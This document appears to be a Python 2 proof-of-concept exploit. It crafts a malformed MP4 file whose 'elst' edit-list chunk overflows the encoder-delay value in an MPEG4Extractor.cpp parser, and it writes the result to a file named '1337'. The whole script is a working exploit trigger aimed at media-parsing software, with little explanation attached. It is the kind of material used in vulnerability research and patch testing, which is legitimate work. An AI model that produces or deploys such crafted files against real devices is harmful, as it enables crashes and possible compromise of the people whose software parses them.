# Proof of Concept
# Integer overflow while parsing an 'elst' chunk in MPEG4Extractor.cpp
# Overflown parameter: kKeyEncoderDelay

import struct

def packL32(data):
	return struct.pack("<I", data)
def packB32(data):
	return struct.pack(">I", data)
def packB64(data):
	return struct.pack(">Q", data)

def make_chunk(fourcc, data, length=0):
	if length == 0:
		length = len(data) + 8 # data + length as packL32
	return packB32(length) + fourcc + data

def add_elst():  # trigger overflow, depth: 2
	      # version  flags           el entries    duration      media_time 
	elst = '\x01' + '\x00\x00\x00' + packB32(1)  + packB64(26) + packB64(1030792151040)
	return make_chunk('elst', elst)

def add_track(innerchunks): # depth: 1
	return make_chunk('trak', innerchunks) 

def add_moov(innerchunks):  # depth: 0
	return make_chunk('moov', innerchunks) 

def add_enca():  # set track sample_rate, depth: 2
	samplerate = packB32(621346816) #'\x25\x09\x00\x00'
	_buffer = '\x00'*8 + '\x00\x01' + '\x00'*6 + '\x00\x01' + '\x00\x1F' + packB32(0) + samplerate
	return make_chunk('enca', _buffer)

def add_mdhd(): # set track duration, depth: 2
	      # ver                 timescale    duration	 lang
	data = '\x00' + '\x00'*11 + packB32(5) + packB32(4096) + '\x01\x01'
	return make_chunk('mdhd', data)

def add_mvhd(): # depth: 1
	header = '\x01\x00\x00\x00\x80' + '\x00'*9 + '\x03\xE8\x00\x00\x00\x80\x00' + '\x01\x00\x00' +  '\x00'*6 + '\x02\x28'
        return make_chunk('mvhd', header)

header = '\x00\x00\x00\x14\x66\x74\x79\x70'  \
       + '\x69\x73\x6F\x6D\x00\x00\x00\x01'  \
       + '\x69\x73\x6F\x6D'
data = header

innerchunks  = add_enca()
innerchunks += add_mdhd()
innerchunks += add_elst() 

data += add_moov(add_mvhd() + add_track(innerchunks))
print data

with open('1337', 'wb') as writehdl:
	writehdl.write(data)




